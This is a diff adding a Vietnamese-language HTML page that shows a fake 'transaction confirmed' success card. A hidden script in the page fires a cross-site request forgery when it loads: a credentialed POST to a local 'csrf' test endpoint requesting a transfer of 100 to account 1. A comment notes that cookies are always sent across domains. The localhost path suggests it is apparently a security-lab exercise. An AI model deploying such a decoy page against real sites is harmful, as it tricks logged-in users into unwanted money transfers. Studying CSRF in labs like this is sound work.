@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Xác nhận giao dịch</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'DM Sans',sans-serif; background:#f0fdf4; display:flex; align-items:center; justify-content:center; min-height:100vh; }
+  .card {
+    background:white; border-radius:16px; padding:40px 36px;
+    max-width:420px; width:90%; text-align:center;
+    box-shadow:0 8px 40px rgba(0,0,0,.08);
+  }
+  .check { font-size:64px; margin-bottom:16px; }
+  h1 { font-size:22px; font-weight:700; color:#15803d; margin-bottom:8px; }
+  p  { font-size:14px; color:#64748b; line-height:1.6; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="check">✅</div>
+  <h1>Xác nhận thành công!</h1>
+  <p>Giao dịch của bạn đã được xác nhận.<br>Cảm ơn bạn đã sử dụng dịch vụ.</p>
+</div>
+
+<script>
+  fetch('http://localhost/Cyber-Security/test.php?page=csrf', {
+    method: 'POST',
+    credentials: 'include', //luôn gửi cookie dù khác domain
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'to=1&amount=100&transfer=1'
+  });
+</script>
+
+</body>
+</html>
